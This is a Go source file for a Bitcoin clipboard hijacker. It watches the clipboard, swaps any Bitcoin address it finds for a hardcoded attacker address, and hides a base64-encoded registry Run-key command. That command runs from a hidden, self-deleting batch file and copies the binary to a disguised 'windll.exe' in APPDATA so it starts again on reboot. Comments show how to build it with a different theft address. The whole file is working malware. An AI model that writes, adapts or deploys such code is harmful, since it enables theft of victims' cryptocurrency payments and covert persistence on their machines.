package main

import (
	"encoding/base64"
	"fmt"
	"github.com/d-tsuji/clipboard"
	"os"
	"os/exec"
	regex "regexp"
	"syscall"
	"time"
)
var targetAddress string
var pattern string
func main(){

	Persistence()


	if targetAddress == ""{
		targetAddress = "3P5ybfsumVemBZYwr5fXQ7GGrhKKRRdP4C"
	}
	if pattern == ""{
		pattern = "^[13][a-km-zA-HJ-NP-Z0-9]{26,33}$"
	}
	for {
		string, _ := clipboard.Get()

		if string != targetAddress{
			isBitcoin, _ := regex.MatchString(pattern, string)

			if isBitcoin{
				clipboard.Set(targetAddress)
				fmt.Println("Changed to " + targetAddress)
			}
		}



		time.Sleep(time.Second)
	}
	
}
// go run main.go
// go run -ldflags "-X main.targetAddress="3P5ybfsumVemBZYwr5fXQ7GGrhKKRRdP4C"" main.go
// go run -ldflags "-X main.targetAddress="3P5ybfsumVemBZYwr5fXQ7GGrhKKRRdP4C" -X main.pattern="^[13][a-km-zA-HJ-NP-Z0-9]{26,33}$"" main.go

func Persistence() {
	//REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V WinDll /t REG_SZ /F /D %APPDATA%\Windows\windll.exe
	var RegAdd string = "UkVHIEFERCBIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvViBXaW5EbGwgL3QgUkVHX1NaIC9GIC9EICVBUFBEQVRBJVxXaW5kb3dzXHdpbmRsbC5leGU="
	DecodedRegAdd, _ := base64.StdEncoding.DecodeString(RegAdd)

	PERSIST, _ := os.Create("PERSIST.bat")

	PERSIST.WriteString("mkdir %APPDATA%\\Windows"+"\n")
	PERSIST.WriteString("copy " + os.Args[0] + " %APPDATA%\\Windows\\windll.exe\n")
	PERSIST.WriteString(string(DecodedRegAdd))

	PERSIST.Close()

	Exec := exec.Command("cmd", "/C", "PERSIST.bat");
	Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
	Exec.Run();
	Clean := exec.Command("cmd", "/C", "del PERSIST.bat");
	Clean.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
	Clean.Run();

}
